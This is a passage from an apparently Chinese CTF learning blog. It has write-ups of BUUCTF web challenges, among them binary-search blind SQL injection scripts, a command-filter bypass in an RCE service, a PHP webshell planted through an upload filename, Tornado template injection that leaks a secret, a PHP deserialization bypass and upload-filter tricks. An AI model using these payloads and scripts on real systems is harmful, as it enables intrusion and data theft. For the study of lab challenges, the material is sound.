<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#x2F;**&#x2F;and&#x2F;**&#x2F;substr(database(),1,1)&#x3D;&#39;1&#39;--</span><br></pre></td></tr></table></figure>

<p>学习一下使用二分法进行爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;b2b3ad31-796e-489d-8ad3-3dc8c3fc8257.node3.buuoj.cn&#x2F;?stunum&#x3D;&quot;</span><br><span class="line">s&#x3D;requests.session()</span><br><span class="line">database&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,10000):</span><br><span class="line">    low &#x3D;32</span><br><span class="line">    high&#x3D;128</span><br><span class="line">    mid&#x3D;(low+high)&#x2F;&#x2F;2</span><br><span class="line">    while(low&lt;high):</span><br><span class="line">        #payload_1&#x3D;f&quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span><br><span class="line">        #payload_2&#x3D;f&quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;ascii(substr((select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;&#39;ctf&#39;),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span><br><span class="line">        #payload_3&#x3D;f&quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;ascii(substr((select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;flag&#39;),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span><br><span class="line">        payload_4&#x3D; f&quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;ascii(substr((select&#x2F;**&#x2F;value&#x2F;**&#x2F;from&#x2F;**&#x2F;flag),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span><br><span class="line">        if &quot;Hi admin&quot; in s.get(url+payload_4).text:</span><br><span class="line">            low &#x3D; mid+1</span><br><span class="line">        else:</span><br><span class="line">            high&#x3D;mid</span><br><span class="line">        mid&#x3D;(low+high)&#x2F;&#x2F;2</span><br><span class="line">    if(mid&#x3D;&#x3D;32 or mid&#x3D;&#x3D;132):</span><br><span class="line">        break</span><br><span class="line">    database +&#x3D;chr(mid)</span><br><span class="line">    print(database)</span><br><span class="line">print(database)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>二分法快了不是一倍两倍– 真的超级快==</p>
<h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>让我们以admin的方式登录，并且提示cookie，所以我就在cookie里添加，username=admin，就可以拿到flag了</p>
<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>输入json类型数据:<br><a href="https://www.cnblogs.com/skysoot/archive/2012/04/17/2453010.html">https://www.cnblogs.com/skysoot/archive/2012/04/17/2453010.html</a></p>
<p>测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;&#x2F;&#x2F;有回显</span><br></pre></td></tr></table></figure>

<p>然后想cat却不行，应该是有过滤==，然后去看了一下wp，说是比赛的时候有源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>确实是过滤了很多内容</p>
<p>考点分析一下:</p>
<p><strong>1.如何绕过过滤？</strong><br>绕过preg_match方法有两种:<br>(1).preg_match会去努力的去匹配第一行，所以我们可以利用多行的方式进行绕过:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">cmd&#x3D;&#123;</span><br><span class="line">           &quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat%20&#x2F;home&#x2F;rceservice&#x2F;flag&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以直接加一个**%0A**这个也是代表换行符<br>(2).利用PCRE回溯绕过<br>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag &quot;,&quot;a&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(<span class="string">&quot;http://c7f06821-9d9b-468e-9f9f-21c3454d5c7d.node3.buuoj.cn/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p><strong>2.为什么我们无法使用cat命令？</strong><br>putenv(‘PATH=/home/rceservice/jail’)根据这行源码，读出jail应用于当前环境，我们能使用ls应该是 jali包含了执行二进制文件，所以我们可以直接拉出cat的路径:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;: &quot;</span><br><span class="line">&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag</span><br><span class="line">&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p>
<p>通过以上成功拿到flag</p>
<h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>image.php.bak源码泄露:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">&quot;id&quot;</span>])?$_GET[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">&quot;path&quot;</span>])?$_GET[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">&quot;./&quot;</span> . $row[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>首先进行绕过，这里测试一下绕过语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from images where id&#x3D;&#39;&#39; or path&#x3D;&#39;&#39;;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id=<span class="string">&quot;\\0&quot;</span>;</span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line"><span class="keyword">print</span>($id);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\</span><br></pre></td></tr></table></figure>

<p>可见当我们输入\\0的时候最终的结果是\逃逸出来了，设想一下，如果我们在id输入这个，那么久会变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from images where id&#x3D;&#39;\&#39; or path&#x3D;&#39;&#39;;</span><br><span class="line">此时后面那个单引号被转义，变成是id&#x3D;\&#39; or path&#x3D;&#39;</span><br><span class="line">如果我们在path后插入注入语句or 1&#x3D;1#，将变成</span><br><span class="line">id&#x3D;&#39;\&#39; or path&#x3D;&#39; or 1&#x3D;1#&#39; </span><br></pre></td></tr></table></figure>

<p>这里贴一下盲注脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://803aae5e-79fb-4520-960c-d67666295f67.node3.buuoj.cn/image.php?id=\\0&amp;path=&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">payload = <span class="string">&quot; or ascii(substr((select password from users),&#123;&#125;,1))&gt;&#123;&#125;%23&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    mid= (low+high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(high&gt;low):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;JFIF&#x27;</span> <span class="keyword">in</span> s.get(url+payload.format(i,mid)).text:</span><br><span class="line">        low=mid+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        high=mid</span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">        result +=chr(mid)</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure>

<p>跑出账号密码，登陆以后发现可以上传文件：<br>随便上传了一个内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I logged the file name you uploaded to logs&#x2F;upload.d74bd5e2a76d1aa9b34f21ca9e866a8b.log.php. LOL</span><br></pre></td></tr></table></figure>

<p>无法上传php文件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522201428.png" alt="img"></p>
<p>但是可以发现 我们存入的文件名都出现在了这个php文件当中<br>如果我们传入一句话木马文件名，那么就会被这个php解析了</p>
<p>由于php被过滤了，所以这里我们使用短标签进行绕过:<br>burp抓包，改文件名为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?&#x3D;@eval($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>POST数据或者蚁剑连接都行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>有点久没刷题了、。。罪过，这次也是收获了不少，感觉sql的调试技巧有点遗忘了，直接复制代码会本地测试就行了~</p>
]]></content>
  </entry>
  <entry>
    <title>buuctf2</title>
    <url>/2021/03/18/buuctf2/</url>
    <content><![CDATA[<h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><p>在hints.txt中发现文件包含，但是需要满足同时输入以下内容 我们不知道cookie_secret所以这里MD5解码一下然后去看一下 <a id="more"></a><br>md5(cookie_secret+md5(filename))<br>619ae5434035a986a24fdc06520654a3发现解不开，所以更换思路<br>看到welcome.txt提示render（渲染），结合标题tornado（python框架）推测存在ssti注入</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210318011110.png" alt="img" style="zoom:50%;">
出现不同参数，去tornado查找一下参数看看：
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210318011520.png" alt="img" style="zoom:67%;">
发现cookie_secret，想想有没有获取到这个内容的方法

<p>由于是tornado框架，于是去查询了：<br>cookie_secret在tornado.web.RequestHandler当中生成<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210318134040.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210318134034.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210318013138.png" alt="img" style="zoom:67%;">

<p>而要访问tornado.web.RequestHandler的对象，需要使用handler，所以这里的payload即为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">handler.settings</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210318013303.png" alt="img" style="zoom:67%;">
即可拿到秘钥:

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br></pre></td></tr></table></figure>

<p>这里写了个脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">hash_encode=<span class="string">&#x27;/fllllllllllllag&#x27;</span></span><br><span class="line">hash_encode = hashlib.md5(hash_encode.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">hash_co_secret=<span class="string">&#x27;5b1ce5ca-faa2-4f23-8b87-767c644f4baa&#x27;</span>+hash_encode</span><br><span class="line">hash_encode=hashlib.md5(hash_co_secret.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">print(hash_encode)</span><br></pre></td></tr></table></figure>

<h3 id="拓展学习："><a href="#拓展学习：" class="headerlink" title="拓展学习："></a>拓展学习：</h3><p>Tornado.web.Application的settings参数:</p>
<p><a href="https://blog.csdn.net/ljphilp/article/details/47103745">https://blog.csdn.net/ljphilp/article/details/47103745</a></p>
<h3 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h3><p>在思考这题的时候一直在想赵老师说的遇到不懂的就去查一下相关资料，一直在思考这其中的思考链：<br>结合tornado render 我们大致可以推测出有关python的模板注入——在找到ssti注入点后，我思考的是通过子类追踪到cookie_secret但是被过滤掉了太多内容，所以这个时候应该换一个思路——<br>cookie_secret放在哪里？查到资料放在Tornado.web.Application.RequestHandler.settings这个当中，那么我们如何进入这个子类查询到setting呢？<br><img src="file:///C:\Users\10452\AppData\Roaming\Tencent\Users\1045225639\QQ\WinTemp\RichOle\C_75AK4VF3~WU]1T6TJ0MQS.png" alt="img" style="zoom: 50%;"><br>此时我们就可以发现这个东西，然后接下来去构造语句去试探。</p>
<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>备份文件源码泄露的亚子，于是试了一下几个常见的备份，发现<a href="http://www.zip备份文件泄露/">www.zip备份文件泄露</a><br>打开index.php得到:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">   $select = $_GET[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">   $res=unserialize(@$select);</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>反序列化漏洞？再看看其他</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<p>八成试了，看到这个_wakeup()函数了，这个时候我们需要绕过函数，去看看如何写程序:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>);<span class="comment">//这的100是数字不是str所以不能加引号。</span></span><br><span class="line">$b=serialize($a);</span><br><span class="line">$b=str_ireplace(<span class="string">&quot;:2:&quot;</span>,<span class="string">&quot;:3:&quot;</span>,$b);</span><br><span class="line"><span class="keyword">print</span>($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:+4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>但是我不管如何尝试都没有回显，于是打开phpstorm手动调试了一下发现是可以进入flag的</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210318144658.png" alt="img" style="zoom:50%;">
这个时候就很懵了，于是去查了一下wp:
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210318145208.png" alt="img" style="zoom:67%;">
**上面是public属性时的username和password参数，下面是private参数的，可以看到Name和username之间都有一个空格，**当我复制到url的时候这个截断就没了，所以需要加个%00

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="一点体会"><a href="#一点体会" class="headerlink" title="一点体会:"></a>一点体会:</h3><p>在做buu的题目的时候，感觉整体思路是可以有了，但是总是会卡在某些点，比如上面这个，我就不清楚private原来和global有这个不同，以后遇到这中情况，记得去对比一下public，或者看一下和以前做过的题比哪里不一样了，寻找突破点。</p>
<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>思路:确定白黑名单过滤，若为黑名单，尝试php3,phtml等后缀，修改mime类型绕过图片检查，加入图片文件头等:<br>发现检查了&lt;?所以更换一句话木马书写方式:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>evla($_POST[a]);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_FILES[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 允许上传的图片后缀</span></span><br><span class="line">$allowedExts = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;phtm&quot;</span>);</span><br><span class="line">$temp = explode(<span class="string">&quot;.&quot;</span>, $file[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">$extension = strtolower(end($temp));        <span class="comment">// 获取文件后缀名</span></span><br><span class="line">$image_type = @exif_imagetype($file[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> ((($file[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/gif&quot;</span>)</span><br><span class="line">|| ($file[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">|| ($file[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpg&quot;</span>)</span><br><span class="line">|| ($file[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)</span><br><span class="line">|| ($file[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/x-png&quot;</span>)</span><br><span class="line">|| ($file[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>))</span><br><span class="line">&amp;&amp;$file[<span class="string">&quot;size&quot;</span>] &lt; <span class="number">20480</span>)    <span class="comment">// 小于 20 kb</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($file[<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ERROR!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (in_array($extension, $allowedExts)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NOT！&quot;</span>.$extension.<span class="string">&quot;!&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">elseif</span> (mb_strpos(file_get_contents($file[<span class="string">&quot;tmp_name&quot;</span>]), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NO! HACKER! your file included &#x27;&amp;#x3C;&amp;#x3F;&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t lie to me, it&#x27;s not image at all!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $fileName=<span class="string">&#x27;./upload/&#x27;</span>.$file[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>],$fileName); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;上传文件名: &quot;</span> . $file[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Not image!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这边需要猜测上传路径，由于页面为upload_file.php,所以这里猜测upload，发现可以连接上:,找到以上源码，学习分析一波:</p>
<p>黑名单，检查MIME类型，检查&lt;?，使用了exif_imagetype函数，这个函数是检查文件的前几个字节，upload里面有介绍过，使用文件马绕过，这里可以使用文件合成以后，再将后缀改回phtml直接上传。<br>这里有个巨坑！！！！！！！！！！<br>文件大小小于20kb，我一开始用图片马不行，后来看了wp看到人家只用了gif89a就可直接绕过，明明我用文件合成以后也有这个，才发现原来是有个文件大小限制，我吐了！！这一点以后要记住呀<br>不然也可以以后直接使用GIF89a实现绕过。就不用考虑文件大小的关系了。<br>尝试了一下，这题用不了apache的解析漏洞</p>
<p>这里再来梳理一下<strong>这题的思路吧</strong>:<br>黑名单or白名单:<br>黑名单:先使用其他后缀进行尝试，或者使用解析漏洞，若被拦截，改一下mime类型以及加一下头识别字节(GIF89a)<br>文件上传最主要的还是耐心吧，毕竟有很多要去测试</p>
<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>扫描目录，后缀字典，看看有么有隐藏目录，发现/Secret.php</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210318175852.png" alt="img" style="zoom:67%;">

<p>一看就知道要改referer，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210318180900.png" alt="img" style="zoom:67%;"></p>
<p>中间有个改浏览器的，直接看看哪里有个firefox，然后改一下</p>
<h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>双写绕过+union select</p>
<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>burp suit改后缀，phtml后缀即可绕过,这里需要抓包改后缀</p>
<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>备份文件尝试一下 发现index.php.bak</p>
